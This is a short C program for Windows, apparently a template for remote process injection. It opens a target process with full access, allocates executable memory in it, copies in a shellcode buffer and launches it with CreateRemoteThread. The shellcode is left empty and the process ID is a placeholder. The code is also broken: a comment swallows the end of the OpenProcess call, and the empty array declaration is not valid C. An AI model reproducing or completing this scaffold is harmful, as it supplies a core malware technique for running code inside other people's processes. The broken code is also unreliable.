// Remote Process Injection

#include <windows.h>
#include <stdio.h>

int main()

{
	char shellcode[] = {};
	HANDLE hProcess; 
	HANDLE hThread;
	void* exec_mem;
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, //PID HERE);
	exec_mem = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(hProcess, exec_mem, shellcode, sizeof(shellcode), NULL);
	hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, 0);
	CloseHandle(hProcess);
	return 0;
	
}
